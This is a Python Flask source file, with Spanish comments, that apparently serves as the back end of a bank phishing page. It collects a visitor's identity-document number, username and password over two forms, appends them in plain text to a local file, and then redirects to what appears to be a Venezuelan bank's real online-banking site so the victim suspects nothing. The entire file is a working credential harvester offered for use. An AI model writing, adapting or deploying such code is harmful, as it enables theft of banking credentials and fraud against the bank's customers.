from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    documento_identidad = request.form['documento']
    username = request.form['username']
    
    # Guardar los datos en un archivo de texto de forma acumulativa
    with open('datos.txt', 'a') as f:
        f.write(f'Documento de Identidad: {documento_identidad}, Nombre de Usuario: {username}\n')
    
    # Redirigir a una página externa (por ejemplo, Google)
    return render_template('password.html')


@app.route('/password', methods=['POST'])
def password():
    password = request.form['password']
    # Guardar los datos en un archivo de texto de forma acumulativa
    with open('datos.txt', 'a') as f:
        f.write(f'Contraseña: {password}\n\n\n')

    return redirect("https://btenlinea.bt.com.ve")


if __name__ == '__main__':
    app.run(debug=True)